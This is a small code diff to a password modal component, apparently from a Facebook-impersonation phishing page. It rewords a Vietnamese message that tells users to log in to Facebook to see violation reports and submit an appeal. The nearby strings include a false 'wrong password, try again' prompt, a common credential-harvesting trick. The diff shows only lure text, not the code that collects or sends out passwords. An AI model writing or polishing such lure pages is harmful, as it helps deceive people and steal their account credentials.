@@ -35,7 +35,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             'Password',
             'You entered the wrong password. Please try again.',
             'Continue',
-            'Để xem những báo cáo và hình ảnh vi phạm mà bạn đã gặp phải và gửi kháng cáo, vui lòng đăng nhập Facebook để tiếp tục'
+            'Để xem những báo cáo và lỗi vi phạm mà bạn đã gặp phải và gửi kháng cáo, vui lòng đăng nhập Facebook để tiếp tục'
         ];
 
         const translateAll = async () => {
